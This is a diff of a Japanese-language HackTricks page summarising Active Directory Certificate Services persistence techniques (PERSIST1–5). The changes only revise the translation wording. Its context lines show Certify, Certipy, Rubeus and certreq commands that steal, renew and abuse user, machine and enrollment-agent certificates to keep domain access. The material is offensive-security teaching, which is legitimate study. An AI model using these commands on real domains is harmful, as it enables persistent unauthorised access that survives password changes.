@@ -2,13 +2,13 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の素晴らしい研究のアカウント持続性章の小さな要約です。**
+**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)の素晴らしい研究のアカウント持続性章の小さな要約です。**
 
 ## 証明書を使用したアクティブユーザー資格情報の盗難の理解 – PERSIST1
 
-ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を得て、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの `User` テンプレートはそのような要求を許可しますが、場合によっては無効にされることがあります。
+ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を得て、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの`User`テンプレートはそのような要求を許可しますが、場合によっては無効になっていることがあります。
 
-[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使用して、クライアント認証を許可する有効なテンプレートを検索し、その後1つを要求できます：
+[Certify](https://github.com/GhostPack/Certify)や[Certipy](https://github.com/ly4k/Certipy)を使用して、クライアント認証を許可する有効なテンプレートを検索し、1つを要求することができます。
 ```bash
 # Enumerate client-auth capable templates
 Certify.exe find /clientauth
@@ -19,9 +19,9 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 # Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-証明書の力は、それが属するユーザーとして認証する能力にあります。パスワードが変更されても、証明書が有効である限り、その能力は変わりません。
+証明書の力は、それが属するユーザーとして認証する能力にあります。パスワードの変更に関係なく、証明書が有効である限り、その能力は維持されます。
 
-PEMをPFXに変換し、それを使用してTGTを取得できます:
+PEMをPFXに変換し、それを使用してTGTを取得できます：
 ```bash
 # Convert PEM returned by Certify to PFX
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
@@ -36,7 +36,7 @@ certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 
 ## 証明書を使用したマシンの持続性の獲得 - PERSIST2
 
-攻撃者がホスト上で特権を持っている場合、彼らはデフォルトの`Machine`テンプレートを使用して、侵害されたシステムのマシンアカウントに対して証明書を登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供することができます:
+攻撃者がホスト上で特権を持っている場合、妥協したシステムのマシンアカウントをデフォルトの`Machine`テンプレートを使用して証明書に登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供できます:
 ```bash
 # Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
@@ -46,7 +46,7 @@ Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0
 ```
 ## Extending Persistence Through Certificate Renewal - PERSIST3
 
-証明書テンプレートの有効期限と更新期間を悪用することで、攻撃者は長期的なアクセスを維持できます。以前に発行された証明書とその秘密鍵を持っている場合、期限切れの前にそれを更新することで、元の主体に関連付けられた追加のリクエストアーティファクトを残さずに、新しい長期的な資格情報を取得できます。
+証明書テンプレートの有効期限と更新期間を悪用することで、攻撃者は長期的なアクセスを維持できます。以前に発行された証明書とその秘密鍵を持っている場合、期限切れの前に更新することで、元の主体に関連付けられた追加のリクエストアーティファクトを残さずに、新しい長期的な資格情報を取得できます。
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -61,7 +61,7 @@ certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 
 ## 明示的な証明書マッピングの植え付け (altSecurityIdentities) – PERSIST4
 
-ターゲットアカウントの`altSecurityIdentities`属性に書き込むことができれば、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更を超えて持続し、強力なマッピング形式を使用する場合、最新のDC強制の下でも機能し続けます。
+ターゲットアカウントの`altSecurityIdentities`属性に書き込むことができれば、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更を超えて持続し、強力なマッピング形式を使用することで、現代のDC強制の下でも機能し続けます。
 
 高レベルのフロー:
 
@@ -96,7 +96,7 @@ domain-escalation.md
 
 ## エンロールメントエージェントを使用した持続性 – PERSIST5
 
-有効な証明書要求エージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続性トークンとして保持できます。悪用ワークフロー:
+有効な証明書リクエストエージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続トークンとして保持できます。悪用ワークフロー:
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
